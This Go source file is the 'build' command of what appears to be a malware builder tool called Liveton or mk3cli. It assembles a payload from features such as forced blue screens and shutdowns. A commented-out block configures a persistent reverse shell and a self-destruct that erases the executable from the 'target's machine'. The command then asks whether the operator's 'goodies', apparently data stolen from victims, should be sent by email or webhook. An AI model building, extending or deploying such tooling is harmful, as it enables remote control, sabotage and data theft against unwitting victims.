package commands

import (
	"fmt"
	. "mk3cli/etc"
	. "mk3cli/lib/commands/base"
	. "mk3cli/lib/features/base"
	"strings"
)

// this is to satisfy the compiler so it imports this package...
var Garbage = ""

// ^ik, this is really bad practice

func init() {
	DefaultHandler.AddCommand(Command{
		Name:        "build",
		Description: "Build your payload using the selected features.",
		Args:        []Arg{},
		Exec: func(input []string, this Command) error {
			var fnames = []string{}
			var email string
			var webhook string

			for _, e := range EnabledFeatures {
				fnames = append(fnames, e.Feature.Name)
			}

			if len(fnames) == 0 {
				fmt.Println("You haven't enabled any features yet (try running 'ls').")
			}

			ClearConsole()
			fmt.Println("You are about to build your payload with the following feature set:")
		outer:
			for _, f := range Features {
				for _, e := range EnabledFeatures {
					if f.Name == e.Feature.Name {
						fmt.Println("\n   ┌ " + Green + f.Name + White + DisplayEnabledArgs(f.Args, e.Args) + "\n   └───> " + Gray + f.Description + White)
						continue outer
					}
				}
			}
			res := Input("\nDo you want to continue? [Y/n] >")
			if strings.HasPrefix(strings.ToLower(res), "y") || res == "" {
				changes := ""
				if Contains(fnames, "shutdown") && Contains(fnames, "bsod") {
					ClearConsole()
					fmt.Println("It looks like you have the Shutdown & BSoD payloads enabled.")
					fmt.Println("Due to their functionality, these 2 features conflict with each other.")
					fmt.Println("\n[1]  ┌ " + Green + "bsod" + White + DisplayEnabledArgs(EnabledFeatures[IndexOf(fnames, "bsod")].Feature.Args, EnabledFeatures[IndexOf(fnames, "bsod")].Args) + "\n     └───> " + Gray + EnabledFeatures[IndexOf(fnames, "bsod")].Feature.Description + White)
					fmt.Println("\n[2]  ┌ " + Green + "shutdown" + White + DisplayEnabledArgs(EnabledFeatures[IndexOf(fnames, "shutdown")].Feature.Args, EnabledFeatures[IndexOf(fnames, "shutdown")].Args) + "\n     └───> " + Gray + EnabledFeatures[IndexOf(fnames, "shutdown")].Feature.Description + White)
					fmt.Println("\n[3]  Both\n")
					res = Input("Please select which feature you would like to disable > ")
					ClearConsole()
					if res == "1" || res == "bsod" {
						EnabledFeatures = RemoveFeature(EnabledFeatures, IndexOf(fnames, "bsod"))
						changes += "> Disabled the bsod payload."
					} else if res == "2" || res == "shutdown" {
						EnabledFeatures = RemoveFeature(EnabledFeatures, IndexOf(fnames, "shutdown"))
						changes += "> Disabled the shutdown payload."
					} else if res == "3" || strings.ToLower(res) == "both" {
						EnabledFeatures = RemoveFeature(EnabledFeatures, IndexOf(fnames, "bsod"))
						EnabledFeatures = RemoveFeature(EnabledFeatures, IndexOf(fnames, "shutdown"))
						changes += "> Disabled the bsod payload.\n"
						changes += "> Disabled the shutdown payload.\n"
					} else {
						fmt.Println(Red + "Invalid Response; Aborting..." + White)
						return nil
					}
					fmt.Println(changes)
				}

				// this is a bunch of extra logic for the lshell payload
				// I commented this because I remove lshell
				/**********************************************************************************/
				//if Contains(fnames, "lshell") {
				//	ClearConsole()
				//	if EnabledFeatures[IndexOf(fnames, "lshell")].Args[0].Value == false {
				//		if changes != "" {
				//			fmt.Println("Looks like you also have the LShell Reverse Shell payload enabled, but with the startup flag set to false.")
				//		} else {
				//			fmt.Println("Looks like you have the LShell Reverse Shell payload enabled, but with the startup flag set to false.")
				//		}
				//		fmt.Println("Because of this, the shell will be no longer be accessible once the user restarts their machine.")
				//		res = Input("Is this behavior intentional? [Y/n] > ")
				//		if strings.HasPrefix(strings.ToLower(res), "y") || res == "" {
				//			fmt.Println("Liveton includes a built-in self destruct feature that automatically removes the executable from the target's machine.")
				//			res = Input("Would you like to enable this feature? [y/N] > ")
				//			if strings.HasPrefix(strings.ToLower(res), "y") {
				//				changes += "> Enabled the melt payload.\n"
				//			}
				//		} else if strings.HasPrefix(strings.ToLower(res), "n") {
				//			fmt.Println("What behavior were you attempting to create?")
				//			fmt.Println("\n[1] I wanted the reverse shell to start on every boot")
				//			fmt.Println("\n[2] I didn't want a reverse shell")
				//			res = Input("\nPlease select an option > ")
				//			if res == "1" {
				//				changes += "> Set the lshell startup flag to 'true'.\n"
				//			} else if res == "2" {
				//				changes += "> Disabled the lshell payload.\n"
				//			} else {
				//				fmt.Println(Red + "Invalid Response; Aborting..." + White)
				//			}
				//		} else {
				//			fmt.Println(Red + "Invalid Response; Aborting..." + White)
				//		}
				//	}
				//}

				ClearConsole()
				fmt.Println(changes)
				fmt.Println("How would you like to receive your goodies?")
				fmt.Println("\n[1] By Email")
				fmt.Println("\n[2] By Webhook")
				fmt.Println("\n[3] I'm not interested in my 'goodies'.")
				res = Input("\nPlease select an option > ")
				switch res {
				// if the user chooses email
				case "1":
					email = Input("Please enter the email address you would like them sent to\n   email > ")
					for !IsValidEmail(email) {
						fmt.Println(Red + "Invalid Email Address")
						email = Input("Please enter the email address you would like them sent to\n   email > ")
					}
					break

				// if the user chooses webhook
				case "2":
					webhook = Input("Please paste the webhook url you would like them sent to\n   url > ")
					for !IsValidURL(webhook) || !strings.Contains(webhook, "webhooks") {
						fmt.Println(Red + "Invalid Webhook")
						webhook = Input("Please paste the webhook url you would like them sent to\n   url > ")
					}
					break

				// if the user chooses not to recieve their data
				case "3":
					res = Input("Are you sure? > ")
					if strings.HasPrefix(strings.ToLower(res), "y") {
						Write("I mean", 15)
						Write("... ", 100)
						Sleep(500)
						WriteLn("you do you I guess.", 15)
						Sleep(1000)
					}
					break
				default:
					fmt.Println(Red + "Invalid Response; Aborting..." + White)
				}

			} else if strings.HasPrefix(strings.ToLower(res), "n") {
				println("Cancelling...")
				return nil
			} else {
				fmt.Println(Red + "Invalid Response; Aborting..." + White)
				return nil
			}
			return nil
		},
	})
}
